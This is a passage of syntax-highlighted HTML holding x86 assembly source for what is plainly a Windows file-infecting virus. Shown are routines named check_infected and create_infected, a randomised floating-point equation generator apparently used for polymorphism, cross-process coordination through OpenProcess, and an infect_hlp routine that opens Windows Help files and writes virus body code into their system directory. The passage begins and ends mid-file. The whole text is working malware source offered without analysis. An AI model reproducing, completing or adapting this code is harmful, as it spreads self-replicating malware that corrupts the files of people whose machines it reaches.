    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc10">tbyte</span><span class="sc4">-</span><span class="sc10">dword</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;compare the results</span><span class="sc0">
    </span><span class="sc6">lahf</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,-</span><span class="sc10">tbyte</span><span class="sc0">
    </span><span class="sc6">wait</span><span class="sc0">
    </span><span class="sc5">fnrstor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,-</span><span class="sc2">128</span><span class="sc0">
    </span><span class="sc6">sahf</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ci_failed</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">paramz</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ci_finish</span><span class="sc0">
   </span><span class="sc5">ci_failed</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">paramz</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc5">ci_finish</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">paramz</span><span class="sc4">+(</span><span class="sc2">5</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;UnMapViewOfFile</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;CloseHandle</span><span class="sc0">
    </span><span class="sc5">end_thread</span><span class="sc0"> </span><span class="sc5">check_infected</span><span class="sc0">
</span><span class="sc5">check_infected</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">infect_hlp</span><span class="sc4">-</span><span class="sc5">create_infected</span><span class="sc0">
</span><span class="sc5">create_infected</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc5">start_thread</span><span class="sc0"> </span><span class="sc5">create_infected</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">vbody</span><span class="sc4">+</span><span class="sc5">vsize</span><span class="sc4">+</span><span class="sc2">260</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">241</span><span class="sc0">             </span><span class="sc1">;number of the terms in a</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">29</span><span class="sc0">              </span><span class="sc1">;equation</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">128</span><span class="sc0">
    </span><span class="sc7">fnsave</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">221</span><span class="sc0">             </span><span class="sc1">;generate a multiplier (+/-)</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">100000</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc7">fld1</span><span class="sc0">
    </span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc7">fchs</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc7">fimul</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">tbyte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,-</span><span class="sc10">tbyte</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">119</span><span class="sc0">             </span><span class="sc1">;generate an exponent</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">41</span><span class="sc0">              </span><span class="sc1">;next term in the equation</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">110</span><span class="sc0">             </span><span class="sc1">;two points on the curve</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc5">fnrstor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,-</span><span class="sc2">128</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc10">tbyte</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">                   </span><span class="sc1">;calculate an angle, it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;means: call other process</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">paramz</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">paramz</span><span class="sc4">+(</span><span class="sc2">5</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">active</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">process</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">1F0FFFh</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;OpenProcess</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">40</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">13</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;WaitForSingleObject</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">paramz</span><span class="sc4">+(</span><span class="sc2">5</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">end_thread</span><span class="sc0"> </span><span class="sc5">create_infected</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">66</span><span class="sc0">              </span><span class="sc1">;generate an exponent</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">11</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">14</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc7">fild</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc0">
    </span><span class="sc9">dt</span><span class="sc0"> </span><span class="sc2">3FEB8637BD05AF6C69B6r</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">tbyte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">25</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">1000000</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc7">fimul</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc7">fsub</span><span class="sc0">
    </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">tbyte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,-</span><span class="sc10">tbyte</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;get a random value</span><span class="sc0">
   </span><span class="sc5">lpGetTickCount</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc2">33</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">197</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">16</span><span class="sc4">)-</span><span class="sc5">create_infected</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">create_infected</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">infect_exe</span><span class="sc4">-</span><span class="sc5">infect_hlp</span><span class="sc0">
</span><span class="sc5">infect_hlp</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc5">start_thread</span><span class="sc0"> </span><span class="sc5">infect_hlp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">vbody</span><span class="sc4">+</span><span class="sc5">__return</span><span class="sc4">+</span><span class="sc2">11</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">],</span><span class="sc2">02EBh</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">vbody</span><span class="sc4">+</span><span class="sc5">vsize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc2">0c0000000h</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;open file</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">ih_failed</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">lpGlobalAlloc</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;GlobalAlloc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">ih_free</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">35f3fh</span><span class="sc0">          </span><span class="sc1">;hlp signature</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ih_free</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">55</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;directory offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read</span><span class="sc0">
   </span><span class="sc5">ih_search</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">ih_free</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc12">'SYS|'</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ih_search</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">'MET'</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ih_search</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">21</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,-</span><span class="sc2">512</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">21</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,-</span><span class="sc2">549</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hlp1_s</span><span class="sc4">-</span><span class="sc5">infect_hlp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">size</span><span class="sc4">-</span><span class="sc5">hlp1_s</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">hlp1_e</span><span class="sc4">-</span><span class="sc5">hlp1_s</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">vbody</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,-</span><span class="sc5">vsize</span><span class="sc0">
